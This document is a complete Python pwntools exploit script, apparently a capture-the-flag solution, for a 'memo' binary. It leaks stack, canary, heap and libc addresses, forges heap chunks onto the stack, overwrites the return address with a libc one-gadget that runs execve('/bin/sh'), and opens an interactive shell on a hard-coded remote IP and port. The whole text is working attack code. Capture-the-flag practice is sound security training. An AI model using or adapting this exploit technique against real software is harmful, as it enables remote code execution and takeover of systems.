from pwn import *

context.log_level = "debug"
def create_memo(data, answer, one_more_data=None):
    conn.sendlineafter("> ","1")
    conn.sendlineafter("Data: ", data)
    if answer[:3] == "yes":
        conn.sendafter("[yes/no] ", answer)
    else:
        conn.sendafter("[yes/no] ", answer)
        conn.sendafter("Data: ", one_more_data)

def show_memo():
    conn.sendlineafter("> ","2")
    conn.recvuntil("Data: ")

def delete_memo():
    conn.sendlineafter("> ","3")

def tap_out(answer):
    conn.sendlineafter("> ","4")
    conn.sendafter("[yes/no] ", answer)

def exploit():
    create_memo("A" * 0x1f, "no", "A" * 0x1f)
    show_memo()
    conn.recv(0x20)
    #chunk: 0x7ffee7b7d3c0
    #leak: 0x7ffee7b7d4d0
    STACK_CHUNK = u64(conn.recv(6) + "\x00" * 2) - (0x7ffee7b7d4d0 - 0x7ffee7b7d3c0)
    log.success("STACK_CHUNK :0x%x" % STACK_CHUNK)
    delete_memo()
    create_memo("A" * 0x28, "no", "A" * 0x28)
    show_memo()
    conn.recvuntil("A" * 0x28)
    conn.recv(1)
    CANARY = u64("\x00" + conn.recv(7))
    log.success("CANARY :0x%x" % CANARY)
    create_memo("A" * 0x18, "no", "A" * 0x18)
    create_memo("A" * 0x18, "no", "A" * 0x17)
    show_memo()
    conn.recvuntil("A" * 0x18)
    conn.recv(1)
    HEAP = u64("\x00" + conn.recv(3) + "\x00" * 4)
    log.success("HEAP :0x%x" % HEAP)
    create_memo("A" * 0x18, "no", "A" * 0x8 + p64(0x91) + "A" * 0x8)
    create_memo("A" * 0x7 + "\x00", "no", "A" * 0x8)
    create_memo("A" * 0x7 + "\x00", "no", "A" * 0x8)
    create_memo("A" * 0x7 + "\x00", "no", "A" * 0x8)
    create_memo("A" * 0x7 + "\x00", "no", "A" * 0x8 + p64(0x31))
    create_memo("A" * 0x7 + "\x00", "no", "A" * 0x8)
    tap_out("no\x00" + "A" * 21 + p64(HEAP + 0xe0))
    delete_memo()
    tap_out("no\x00" + "A" * 21 + p64(HEAP + 0xc0))
    delete_memo()
    show_memo()
    LEAK = u64(conn.recv(6) + "\x00" * 2)
    log.success("LEAK :0x%x" % LEAK)
    #libc :0x7fbae5b6e000
    #LEAK :0x7fbae5f32b78
    LIBC = LEAK - (0x7fbae5f32b78 - 0x7fbae5b6e000)
    log.success("LIBC :0x%x" % LIBC)
    create_memo("A" * 0x28, "no", "A" * 0x10 + p64(0x0) + p64(0x21) +  p64(STACK_CHUNK))
    create_memo(p64(LEAK) * (0x28 // 8), "no", "A" * 0x28)
    create_memo("A" * 0x8 + p64(0x21) + p64(STACK_CHUNK + 0x18) + "A" * 0x8 + p64(0x21), "yes")
#0x45216	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
    create_memo("A" * 0x8, "no", p64(CANARY) + "A" * 0x8 + p64(LIBC + 0x45216))
    tap_out("yes\x00")
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "159.203.116.12"
        PORT = 8888
        conn = remote(HOST, PORT)
    else:
        conn = process(["./memo"])#, env={"LD_PRELOAD":"./libc-2.23.so"})
    exploit()
